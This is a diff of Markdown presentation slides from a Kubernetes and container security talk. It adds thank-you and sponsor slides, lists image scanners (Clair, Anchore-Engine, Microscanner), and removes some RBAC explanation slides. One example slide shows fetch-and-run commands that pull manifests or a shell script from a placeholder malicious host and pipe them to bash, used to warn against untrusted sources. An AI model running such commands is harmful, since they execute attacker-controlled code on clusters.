@@ -147,6 +147,19 @@ Recap and tips to take away.
 
 ---
 
+![100%](assets/sponsors.png)
+
+---
+
+# [fit] *Thank you*
+
+## Jeff Strauss
+### *@jeffreystrauss*
+## Jon Mills
+### *@jonathanfmills*
+
+---
+
 # [fit] Climate *Change*
 
 ---
@@ -255,6 +268,10 @@ So how do we feel about this.
 
 ---
 
+![140%](assets/broken.gif)
+
+---
+
 # [fit] Don't use
 # [fit] *kubernetes*
 
@@ -309,12 +326,6 @@ Hands up
 ---
 
 ![80%](assets/yourcodeistheproblem.png)
-
----
-
-* We injected script into an application.
-* We were able to run a remote script from a jumpbox.
-* We could look inside the file system.
 
 ---
 
@@ -409,10 +420,14 @@ Scan these against known bad images.
 
 ---
 
-# Tools
+# [fit] Tools
 
-* *Clair* (CoreOS)
-* *Microscanner* (Aqua Security)
+# [fit] *Clair (CoreOS)*
+# [fit] Anchore-Engine (Anchore)
+
+---
+
+# *Microscanner* (Aqua Security)
 
 ```Dockerfile
 FROM debian:jessie-slim
@@ -562,6 +577,10 @@ How do we know what we're running is what we built?
 
 ---
 
+![150%](assets/kubernetes.gif)
+
+---
+
 # [fit] Where do we 
 # [fit] *learn*
 
@@ -612,11 +631,10 @@ Whats the next step for us to learn this?
 
 ---
 
-```
-$ kubectl create -f http://Insert_Malicious_URL_here/FakeApp.yaml
-```
+# Examples
 
-```
+```bash
+$ kubectl create -f http://Insert_Malicious_URL_here/FakeApp.yaml
 $ curl SRI-Tools.com/fakeapp.sh | bash
 $ Kubectl create –f http://SRI-Tools.com/k8s/FakeApp.yaml
 ```
@@ -711,31 +729,6 @@ Since 1.8, previously abac.
 
 ---
 
-# [fit] Role *assignment*
-
-^
-Has permission only if the subject has selected or been assigned a role.
-
----
-
-# [fit] *Role* authorisation
-
-^
-A subject's active role must be authorized for the subject.
-With rule assignment.
-Ensures that users can take on only roles for which they are authorized.
-
----
-
-# [fit] Permission *authorisation*
-
-^
-A subject can exercise a permission only if the permission is authorized for the subject's active role.
-With rule assignment and authorisation.
-Ensures that users can exercise only permissions for which they are authorized.
-
----
-
 # Master *and* Workers
 
 ---
@@ -752,7 +745,7 @@ Ensures that users can exercise only permissions for which they are authorized.
 
 ---
 
-![](assets/layeredsecurity.png)
+![120%](assets/layeredsecurity.png)
 
 ---
 
